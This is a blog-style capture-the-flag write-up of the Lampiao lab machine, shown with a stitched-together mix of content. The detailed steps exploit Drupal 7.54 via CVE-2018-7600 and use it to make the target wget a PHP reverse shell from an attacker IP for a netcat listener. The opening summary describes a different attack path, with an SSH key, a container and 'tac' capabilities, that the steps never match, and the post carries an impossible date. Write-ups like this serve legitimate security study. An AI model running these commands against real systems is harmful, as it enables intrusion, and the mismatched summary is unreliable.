---
layout: single
title: Lampiao - Proving grounds Play
date: 2023-13-06
classes: wide
header:
  teaser: /assets/images/linux.png
categories:
  - provinggrounds
  - infosec
tags:
  - provinggrounds
  - linux

---

## Linux

![](/assets/images/linux.png)

This blog post is a writeup of the Lampiao machine from Proving grounds play.

### Summary
------------------
- The webserver has a vulnerable function that can be used to browse directories and read files
- We can read the SSH private key from the `nobody` user home directory and log in as `nobody`
- We're within a container but we can log in with SSH as user `monitor` to the host (127.0.0.1)
- There's a logMonitor application running with elevated capabilities (it can read log files even if not running as root)
- This is a hint that we should be looking at capabilities of files (`cap_dac_read_search+ei`)
- We look at the entire filesystem for files with special cap's and we find that the `tac` application has that capabily and we can read `/root/root.txt`

### Detailed steps
------------------

### Enumeration

There's a webserver, a SSH service and another interesting open port (1898) running on this box.

![nmap1](D:\Alex\ESTUDIOS\OSCP\Lorealex.github.io\assets\images\pg-play-lampiao\1.JPG)

Let's take a closer look at these ports with Nmap.
 ```
 nmap -A 192.168.201.48 -p 22,80,1898 -o nmap_lampiao.txt
 ```
![nmap2](D:\Alex\ESTUDIOS\OSCP\Lorealex.github.io\assets\images\pg-play-lampiao\2.JPG)


As we can see in the last picture, the 1898 port it's running an HTTP service. Nmap HTTP enum returns some interesting files as CHANGELOG.TXT

CHANGELOG.txt it's a common file in Drupal which shows the current version.
In this case the current version it's `7.54`.

![changelog](D:\Alex\ESTUDIOS\OSCP\Lorealex.github.io\assets\images\pg-play-lampiao\5.JPG)


`Drupal 7.54` it's vulnerable to a remote code execution as we can see in `CVE-2018-7600` --> https://www.drupal.org/sa-core-2018-002
To exploit this vulnerability I used the following python code --> https://github.com/pimps/CVE-2018-7600

The first step was to check the vulnerability. I successfully executed the exploit with `id` command.
 ```
 python3 drupa7-CVE-2018-7600.py http://192.168.201.48:1898 -c id
 ```

![exploit1](D:\Alex\ESTUDIOS\OSCP\Lorealex.github.io\assets\images\pg-play-lampiao\6.JPG)


Now, in order to gain access to the victim's machine, I uploaded a PHP revershell to the webserver.

Configuring the webshell:
![shell1](D:\Alex\ESTUDIOS\OSCP\Lorealex.github.io\assets\images\pg-play-lampiao\7.JPG)

After configuring the webshell, I opened an HTTP server on my Kali machine with python in my webshell directory:
 ```
 python3 -m http.server 443
 ```

To upload the webshell I used the python exploit to execute a wget command on the victim's machine:
 ```
 python3 drupa7-CVE-2018-7600.py http://192.168.201.48:1898 -c "wget http://192.168.45.177:443/php-reverse-shell.php"
 ```
![exploit2](D:\Alex\ESTUDIOS\OSCP\Lorealex.github.io\assets\images\pg-play-lampiao\8.JPG)


At this point, I was able to access to my webshell on victim's machine and capture the shell running a Netcat listener.
![shell2](D:\Alex\ESTUDIOS\OSCP\Lorealex.github.io\assets\images\pg-play-lampiao\10.JPG)

![shell3](D:\Alex\ESTUDIOS\OSCP\Lorealex.github.io\assets\images\pg-play-lampiao\9.JPG)


Having access to www-data user I was able to find the first flag:
![shell3](D:\Alex\ESTUDIOS\OSCP\Lorealex.github.io\assets\images\pg-play-lampiao\userf.jpg)